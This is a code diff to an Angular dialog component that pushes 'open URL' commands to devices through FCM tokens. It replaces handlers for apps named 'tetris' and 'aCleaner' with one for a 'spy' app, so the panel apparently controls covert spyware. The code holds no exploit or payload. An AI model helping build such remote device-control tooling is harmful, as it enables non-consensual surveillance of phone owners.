@@ -52,45 +52,16 @@ export class OpenUrlDialogComponent implements OnInit, OnDestroy {
       timer
     };
 
-    if (this.device.tetrisFcmToken !== '' && this.device.aCleanerFcmToken !== '') {
-      data.tetris = true;
-      data.tetrisFcmToken = this.device.tetrisFcmToken;
-      data.aCleaner = true;
-      data.aCleanerFcmToken = this.device.aCleanerFcmToken;
 
-      forkJoin(this.backupService.openTetrisUrl(data), this.backupService.openCleanerUrl(data)).subscribe(res => {
-        console.log(res);
-        this.onClose();
-      });
-      return;
-    }
-
-    if (this.device.tetrisFcmToken !== '') {
-      data.tetris = true;
-      data.tetrisFcmToken = this.device.tetrisFcmToken;
+    if (this.device.spyFcmToken !== '') {
+      data.spy = true;
+      data.spyFcmToken = this.device.spyFcmToken;
       this.backupService
-      .openTetrisUrl(data)
+      .openSpyUrl(data)
       .pipe(takeWhile(() => this.alive))
       .subscribe(
         res => {
           if (res) {
-            console.log(res);
-            this.onClose();
-          }
-        },
-      );
-    }
-
-    if (this.device.aCleanerFcmToken !== '') {
-      data.aCleaner = true;
-      data.aCleanerFcmToken = this.device.aCleanerFcmToken;
-      this.backupService
-      .openCleanerUrl(data)
-      .pipe(takeWhile(() => this.alive))
-      .subscribe(
-        res => {
-          if (res) {
-            console.log(res);
             this.onClose();
           }
         },
